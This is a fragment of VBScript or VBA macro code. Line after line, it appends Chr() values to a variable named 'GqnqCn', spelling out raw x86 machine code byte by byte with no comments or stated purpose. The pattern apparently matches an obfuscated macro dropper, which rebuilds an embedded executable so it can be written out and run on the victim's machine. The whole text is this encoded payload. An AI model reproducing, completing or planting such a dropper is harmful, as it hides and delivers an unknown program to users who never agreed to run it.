GqnqCn=GqnqCn&Chr(85)&Chr(12)&Chr(255)&Chr(7)&Chr(139)&Chr(77)&Chr(16)&Chr(233)&Chr(14)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(91)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(131)&Chr(32)&Chr(0)&Chr(255)&Chr(1)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(12)&Chr(83)&Chr(51)&Chr(219)&Chr(86)&Chr(87)&Chr(57)&Chr(29)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(117)&Chr(5)&Chr(232)&Chr(147)&Chr(33)&Chr(0)&Chr(0)&Chr(104)&Chr(4)&Chr(1)&Chr(0)&Chr(0)&Chr(190)&Chr(184)&Chr(175)&Chr(64)&Chr(0)&Chr(86)&Chr(83)&Chr(136)&Chr(29)&Chr(188)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(36)&Chr(128)&Chr(64)&Chr(0)&Chr(161)&Chr(248)&Chr(183)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(140)&Chr(172)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(7)&Chr(137)&Chr(69)&Chr(252)&Chr(56)&Chr(24)&Chr(117)&Chr(3)
GqnqCn=GqnqCn&Chr(137)&Chr(117)&Chr(252)&Chr(139)&Chr(85)&Chr(252)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(83)&Chr(83)&Chr(141)&Chr(125)&Chr(244)&Chr(232)&Chr(10)&Chr(254)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(131)&Chr(196)&Chr(12)&Chr(61)&Chr(255)&Chr(255)&Chr(255)&Chr(63)&Chr(115)&Chr(74)&Chr(139)&Chr(77)&Chr(244)&Chr(131)&Chr(249)&Chr(255)&Chr(115)&Chr(66)&Chr(139)&Chr(248)&Chr(193)&Chr(231)&Chr(2)&Chr(141)&Chr(4)&Chr(15)&Chr(59)&Chr(193)&Chr(114)&Chr(54)&Chr(80)&Chr(232)&Chr(214)&Chr(33)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(89)&Chr(59)&Chr(243)&Chr(116)&Chr(41)&Chr(139)&Chr(85)&Chr(252)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(3)&Chr(254)&Chr(87)&Chr(86)&Chr(141)&Chr(125)&Chr(244)&Chr(232)&Chr(201)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(131)&Chr(196)&Chr(12)&Chr(72)&Chr(163)&Chr(112)&Chr(172)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(116)
GqnqCn=GqnqCn&Chr(172)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(161)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(131)&Chr(236)&Chr(12)&Chr(83)&Chr(86)&Chr(139)&Chr(53)&Chr(60)&Chr(128)&Chr(64)&Chr(0)&Chr(87)&Chr(51)&Chr(219)&Chr(51)&Chr(255)&Chr(59)&Chr(195)&Chr(117)&Chr(46)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(116)&Chr(12)&Chr(199)&Chr(5)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(35)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(120)&Chr(117)&Chr(10)&Chr(106)&Chr(2)&Chr(88)&Chr(163)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(235)&Chr(5)&Chr(161)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(133)&Chr(129)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(59)&Chr(251)&Chr(117)&Chr(15)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(202)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(199)&Chr(102)&Chr(57)&Chr(31)&Chr(116)&Chr(14)&Chr(64)&Chr(64)&Chr(102)&Chr(57)&Chr(24)&Chr(117)&Chr(249)&Chr(64)&Chr(64)&Chr(102)&Chr(57)&Chr(24)&Chr(117)&Chr(242)&Chr(139)&Chr(53)&Chr(52)&Chr(128)&Chr(64)&Chr(0)&Chr(83)&Chr(83)&Chr(83)&Chr(43)&Chr(199)&Chr(83)&Chr(209)&Chr(248)&Chr(64)&Chr(80)&Chr(87)&Chr(83)&Chr(83)&Chr(137)&Chr(69)&Chr(244)&Chr(255)&Chr(214)&Chr(137)&Chr(69)&Chr(248)&Chr(59)&Chr(195)&Chr(116)&Chr(47)&Chr(80)&Chr(232)&Chr(252)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(69)&Chr(252)&Chr(59)&Chr(195)&Chr(116)&Chr(33)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(248)&Chr(80)&Chr(255)&Chr(117)&Chr(244)&Chr(87)&Chr(83)&Chr(83)&Chr(255)&Chr(214)&Chr(133)
GqnqCn=GqnqCn&Chr(192)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(252)&Chr(232)&Chr(76)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(93)&Chr(252)&Chr(139)&Chr(93)&Chr(252)&Chr(87)&Chr(255)&Chr(21)&Chr(48)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(195)&Chr(235)&Chr(92)&Chr(131)&Chr(248)&Chr(2)&Chr(116)&Chr(4)&Chr(59)&Chr(195)&Chr(117)&Chr(130)&Chr(255)&Chr(21)&Chr(44)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(59)&Chr(243)&Chr(15)&Chr(132)&Chr(114)&Chr(255)&Chr(255)&Chr(255)&Chr(56)&Chr(30)&Chr(116)&Chr(10)&Chr(64)&Chr(56)&Chr(24)&Chr(117)&Chr(251)&Chr(64)&Chr(56)&Chr(24)&Chr(117)&Chr(246)&Chr(43)&Chr(198)&Chr(64)&Chr(80)&Chr(137)&Chr(69)&Chr(248)&Chr(232)&Chr(149)&Chr(32)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(59)&Chr(251)&Chr(117)&Chr(12)&Chr(86)&Chr(255)&Chr(21)&Chr(40)&Chr(128)&Chr(64)&Chr(0)&Chr(233)&Chr(69)&Chr(255)&Chr(255)&Chr(255)&Chr(255)
GqnqCn=GqnqCn&Chr(117)&Chr(248)&Chr(86)&Chr(87)&Chr(232)&Chr(87)&Chr(33)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(86)&Chr(255)&Chr(21)&Chr(40)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(199)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(106)&Chr(84)&Chr(104)&Chr(24)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(98)&Chr(8)&Chr(0)&Chr(0)&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(252)&Chr(141)&Chr(69)&Chr(156)&Chr(80)&Chr(255)&Chr(21)&Chr(4)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(106)&Chr(64)&Chr(106)&Chr(32)&Chr(94)&Chr(86)&Chr(232)&Chr(127)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(20)&Chr(2)&Chr(0)&Chr(0)&Chr(163)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(208)&Chr(182)&Chr(64)&Chr(0)&Chr(141)&Chr(136)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(235)&Chr(48)
GqnqCn=GqnqCn&Chr(198)&Chr(64)&Chr(4)&Chr(0)&Chr(131)&Chr(8)&Chr(255)&Chr(198)&Chr(64)&Chr(5)&Chr(10)&Chr(137)&Chr(120)&Chr(8)&Chr(198)&Chr(64)&Chr(36)&Chr(0)&Chr(198)&Chr(64)&Chr(37)&Chr(10)&Chr(198)&Chr(64)&Chr(38)&Chr(10)&Chr(137)&Chr(120)&Chr(56)&Chr(198)&Chr(64)&Chr(52)&Chr(0)&Chr(131)&Chr(192)&Chr(64)&Chr(139)&Chr(13)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(129)&Chr(193)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(59)&Chr(193)&Chr(114)&Chr(204)&Chr(102)&Chr(57)&Chr(125)&Chr(206)&Chr(15)&Chr(132)&Chr(10)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(208)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(56)&Chr(141)&Chr(88)&Chr(4)&Chr(141)&Chr(4)&Chr(59)&Chr(137)&Chr(69)&Chr(228)&Chr(190)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(59)&Chr(254)&Chr(124)&Chr(2)&Chr(139)&Chr(254)&Chr(199)&Chr(69)&Chr(224)&Chr(1)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(235)&Chr(91)&Chr(106)&Chr(64)&Chr(106)&Chr(32)&Chr(232)&Chr(241)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(86)&Chr(139)&Chr(77)&Chr(224)&Chr(141)&Chr(12)&Chr(141)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(137)&Chr(1)&Chr(131)&Chr(5)&Chr(208)&Chr(182)&Chr(64)&Chr(0)&Chr(32)&Chr(141)&Chr(144)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(235)&Chr(42)&Chr(198)&Chr(64)&Chr(4)&Chr(0)&Chr(131)&Chr(8)&Chr(255)&Chr(198)&Chr(64)&Chr(5)&Chr(10)&Chr(131)&Chr(96)&Chr(8)&Chr(0)&Chr(128)&Chr(96)&Chr(36)&Chr(128)&Chr(198)&Chr(64)&Chr(37)&Chr(10)&Chr(198)&Chr(64)&Chr(38)&Chr(10)&Chr(131)&Chr(96)&Chr(56)&Chr(0)&Chr(198)&Chr(64)&Chr(52)&Chr(0)&Chr(131)&Chr(192)&Chr(64)&Chr(139)&Chr(17)&Chr(3)&Chr(214)&Chr(59)&Chr(194)&Chr(114)&Chr(210)&Chr(255)&Chr(69)&Chr(224)&Chr(57)&Chr(61)&Chr(208)&Chr(182)&Chr(64)
GqnqCn=GqnqCn&Chr(0)&Chr(124)&Chr(157)&Chr(235)&Chr(6)&Chr(139)&Chr(61)&Chr(208)&Chr(182)&Chr(224)&Chr(0)&Chr(131)&Chr(101)&Chr(224)&Chr(0)&Chr(133)&Chr(255)&Chr(126)&Chr(109)&Chr(139)&Chr(69)&Chr(228)&Chr(139)&Chr(8)&Chr(131)&Chr(249)&Chr(255)&Chr(116)&Chr(86)&Chr(131)&Chr(249)&Chr(254)&Chr(116)&Chr(81)&Chr(138)&Chr(3)&Chr(168)&Chr(1)&Chr(116)&Chr(75)&Chr(168)&Chr(8)&Chr(117)&Chr(11)&Chr(81)&Chr(255)&Chr(21)&Chr(68)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(60)&Chr(139)&Chr(117)&Chr(224)&Chr(139)&Chr(198)&Chr(193)&Chr(248)&Chr(5)&Chr(131)&Chr(230)&Chr(31)&Chr(193)&Chr(230)&Chr(6)&Chr(3)&Chr(52)&Chr(133)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(139)&Chr(0)&Chr(137)&Chr(6)&Chr(138)&Chr(3)&Chr(136)&Chr(70)&Chr(4)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(141)&Chr(70)&Chr(12)&Chr(80)&Chr(232)&Chr(26)&Chr(18)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(201)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(70)&Chr(8)&Chr(255)&Chr(69)&Chr(224)&Chr(67)&Chr(131)&Chr(69)&Chr(228)&Chr(4)&Chr(57)&Chr(125)&Chr(224)&Chr(124)&Chr(147)&Chr(51)&Chr(219)&Chr(139)&Chr(243)&Chr(193)&Chr(230)&Chr(6)&Chr(3)&Chr(53)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(6)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(11)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(6)&Chr(128)&Chr(78)&Chr(4)&Chr(128)&Chr(235)&Chr(114)&Chr(198)&Chr(70)&Chr(4)&Chr(129)&Chr(133)&Chr(219)&Chr(117)&Chr(5)&Chr(106)&Chr(246)&Chr(88)&Chr(235)&Chr(10)&Chr(139)&Chr(195)&Chr(72)&Chr(247)&Chr(216)&Chr(27)&Chr(192)&Chr(131)&Chr(192)&Chr(245)&Chr(80)&Chr(255)&Chr(21)&Chr(32)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(131)&Chr(255)&Chr(255)&Chr(116)&Chr(67)&Chr(133)&Chr(255)&Chr(116)&Chr(63)
GqnqCn=GqnqCn&Chr(87)&Chr(255)&Chr(21)&Chr(68)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(52)&Chr(137)&Chr(62)&Chr(37)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(2)&Chr(117)&Chr(6)&Chr(128)&Chr(78)&Chr(4)&Chr(64)&Chr(235)&Chr(9)&Chr(131)&Chr(248)&Chr(3)&Chr(117)&Chr(4)&Chr(128)&Chr(78)&Chr(4)&Chr(8)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(141)&Chr(70)&Chr(12)&Chr(80)&Chr(232)&Chr(132)&Chr(17)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(55)&Chr(255)&Chr(70)&Chr(8)&Chr(235)&Chr(10)&Chr(128)&Chr(78)&Chr(4)&Chr(64)&Chr(199)&Chr(6)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(67)&Chr(131)&Chr(251)&Chr(3)&Chr(15)&Chr(140)&Chr(103)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(208)&Chr(182)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(64)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(17)&Chr(51)
GqnqCn=GqnqCn&Chr(192)&Chr(64)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(200)&Chr(255)&Chr(232)&Chr(96)&Chr(6)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(184)&Chr(192)&Chr(146)&Chr(64)&Chr(0)&Chr(190)&Chr(192)&Chr(146)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(248)&Chr(59)&Chr(198)&Chr(115)&Chr(15)&Chr(139)&Chr(7)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(255)&Chr(208)&Chr(131)&Chr(199)&Chr(4)&Chr(59)&Chr(254)&Chr(114)&Chr(241)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(184)&Chr(200)&Chr(146)&Chr(64)&Chr(0)&Chr(190)&Chr(200)&Chr(146)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(248)&Chr(59)&Chr(198)&Chr(115)&Chr(15)&Chr(139)&Chr(7)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(255)&Chr(208)&Chr(131)&Chr(199)&Chr(4)&Chr(59)&Chr(254)&Chr(114)&Chr(241)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)
GqnqCn=GqnqCn&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(139)&Chr(53)&Chr(76)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(33)&Chr(161)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(23)&Chr(80)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(139)&Chr(128)&Chr(248)&Chr(1)&Chr(0)&Chr(0)&Chr(235)&Chr(39)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(11)&Chr(86)&Chr(232)&Chr(203)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(24)&Chr(104)&Chr(132)&Chr(135)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(255)&Chr(117)
GqnqCn=GqnqCn&Chr(8)&Chr(255)&Chr(208)&Chr(137)&Chr(69)&Chr(8)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(93)&Chr(195)&Chr(106)&Chr(0)&Chr(232)&Chr(135)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(139)&Chr(53)&Chr(76)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(33)&Chr(161)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(23)&Chr(80)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(139)&Chr(128)&Chr(252)&Chr(1)&Chr(0)&Chr(0)&Chr(235)&Chr(39)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(11)&Chr(86)&Chr(232)&Chr(80)&Chr(241)&Chr(255)&Chr(255)
GqnqCn=GqnqCn&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(24)&Chr(104)&Chr(176)&Chr(135)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(208)&Chr(137)&Chr(69)&Chr(8)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(93)&Chr(195)&Chr(255)&Chr(21)&Chr(80)&Chr(128)&Chr(64)&Chr(0)&Chr(194)&Chr(4)&Chr(0)&Chr(139)&Chr(255)&Chr(86)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(76)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(133)&Chr(246)&Chr(117)&Chr(27)&Chr(255)&Chr(53)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(101)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(240)&Chr(86)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(84)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(161)&Chr(16)&Chr(161)&Chr(64)
GqnqCn=GqnqCn&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(22)&Chr(80)&Chr(255)&Chr(53)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(59)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(131)&Chr(13)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(161)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(14)&Chr(80)&Chr(255)&Chr(21)&Chr(88)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(13)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(233)&Chr(134)&Chr(7)&Chr(0)&Chr(0)&Chr(106)&Chr(12)&Chr(104)&Chr(56)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(91)&Chr(4)&Chr(0)&Chr(0)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(7)&Chr(86)&Chr(232)&Chr(145)&Chr(240)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(139)&Chr(117)&Chr(8)&Chr(199)&Chr(70)
GqnqCn=GqnqCn&Chr(92)&Chr(8)&Chr(135)&Chr(64)&Chr(0)&Chr(51)&Chr(255)&Chr(71)&Chr(137)&Chr(126)&Chr(20)&Chr(133)&Chr(192)&Chr(116)&Chr(36)&Chr(104)&Chr(132)&Chr(135)&Chr(64)&Chr(0)&Chr(80)&Chr(139)&Chr(29)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(211)&Chr(137)&Chr(134)&Chr(248)&Chr(1)&Chr(0)&Chr(0)&Chr(104)&Chr(176)&Chr(135)&Chr(64)&Chr(0)&Chr(255)&Chr(117)&Chr(228)&Chr(255)&Chr(211)&Chr(137)&Chr(134)&Chr(252)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(126)&Chr(112)&Chr(198)&Chr(134)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(198)&Chr(134)&Chr(75)&Chr(1)&Chr(0)&Chr(0)&Chr(67)&Chr(199)&Chr(70)&Chr(104)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(106)&Chr(13)&Chr(232)&Chr(58)&Chr(8)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(118)&Chr(104)&Chr(255)&Chr(21)&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)
GqnqCn=GqnqCn&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(62)&Chr(0)&Chr(0)&Chr(0)&Chr(106)&Chr(12)&Chr(232)&Chr(25)&Chr(8)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(139)&Chr(69)&Chr(12)&Chr(137)&Chr(70)&Chr(108)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(161)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(137)&Chr(70)&Chr(108)&Chr(255)&Chr(118)&Chr(108)&Chr(232)&Chr(49)&Chr(33)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(21)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(222)&Chr(3)&Chr(0)&Chr(0)&Chr(195)&Chr(51)&Chr(255)&Chr(71)&Chr(139)&Chr(117)&Chr(8)&Chr(106)&Chr(13)&Chr(232)&Chr(1)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(106)&Chr(12)&Chr(232)&Chr(248)&Chr(6)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(53)
GqnqCn=GqnqCn&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(232)&Chr(145)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(208)&Chr(139)&Chr(240)&Chr(133)&Chr(246)&Chr(117)&Chr(78)&Chr(104)&Chr(20)&Chr(2)&Chr(0)&Chr(0)&Chr(106)&Chr(1)&Chr(232)&Chr(147)&Chr(27)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(89)&Chr(89)&Chr(133)&Chr(246)&Chr(116)&Chr(58)&Chr(86)&Chr(255)&Chr(53)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(53)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(232)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(24)&Chr(106)&Chr(0)&Chr(86)&Chr(232)&Chr(197)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(255)&Chr(21)&Chr(100)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(78)&Chr(4)&Chr(255)&Chr(137)&Chr(6)&Chr(235)&Chr(9)&Chr(86)&Chr(232)&Chr(129)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(51)&Chr(246)&Chr(87)&Chr(255)&Chr(21)
GqnqCn=GqnqCn&Chr(96)&Chr(128)&Chr(64)&Chr(0)&Chr(95)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(232)&Chr(127)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(133)&Chr(246)&Chr(117)&Chr(8)&Chr(106)&Chr(16)&Chr(232)&Chr(110)&Chr(239)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(106)&Chr(8)&Chr(104)&Chr(96)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(225)&Chr(2)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(15)&Chr(132)&Chr(248)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(70)&Chr(36)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(52)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(44)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(38)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(52)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(24)&Chr(26)&Chr(0)&Chr(0)&Chr(89)
GqnqCn=GqnqCn&Chr(139)&Chr(70)&Chr(60)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(10)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(64)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(252)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(68)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(238)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(72)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(224)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(92)&Chr(61)&Chr(8)&Chr(135)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(207)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(106)&Chr(13)&Chr(232)&Chr(172)&Chr(6)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(126)&Chr(104)&Chr(133)&Chr(255)&Chr(116)&Chr(26)&Chr(87)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)
